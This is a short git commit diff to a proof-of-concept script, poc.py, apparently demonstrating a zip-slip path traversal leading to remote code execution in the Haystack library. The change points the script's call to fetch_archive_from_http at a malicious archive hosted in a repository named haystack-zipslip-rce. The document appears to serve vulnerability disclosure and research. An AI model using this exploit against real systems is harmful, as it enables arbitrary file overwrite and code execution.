9157df83e1da3e103e4b78ae7a6bef6a95ef9ae8
Luigi Gubello <27034386+luigigubello@users.noreply.github.com>
2024-09-15 14:11:12 +0200

    Update poc.py
    Use zipslip file from the repo

--- poc/poc.py
+++ poc/poc.py
@@ -4,6 +4,6 @@ from haystack.utils import fetch_archive_from_http
 def zipSlip():
     doc_dir = "zip_folder"
     fetch_archive_from_http(
-        url="https://github.com/luigigubello/zipslip-poc/raw/main/zipslip.tar.gz",
+        url="https://github.com/luigigubello/haystack-zipslip-rce/raw/main/zipslip.tar.gz",
         output_dir=doc_dir,
     )
